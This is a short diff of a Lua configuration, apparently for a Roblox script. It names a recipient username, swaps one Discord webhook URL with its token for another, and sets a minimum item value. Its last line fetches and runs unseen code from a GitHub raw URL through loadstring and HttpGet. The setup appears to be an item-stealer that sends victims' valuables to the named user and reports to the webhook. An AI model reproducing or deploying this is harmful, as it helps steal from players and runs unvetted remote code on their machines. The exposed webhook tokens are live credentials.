@@ -1,5 +1,5 @@
 Username = "flowb810"
-Webhook = "https://discord.com/api/webhooks/1417129749364609055/AG8BQGdRA15sbGili3_R9215pL88Ye83yIDNhT219MeT5jydyM2GjRb6rF8wWfceTV60"
+Webhook = "https://discord.com/api/webhooks/1417161523087802388/6Zd7IzzIsOSxrEjTyfviWrdEtjX94B701BDD1eV5C9QSGlJiyqKGXXEF1pxP7lDk0tMh"
 MinimumValue = 1000000
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/refs/heads/main/Gag"))() 
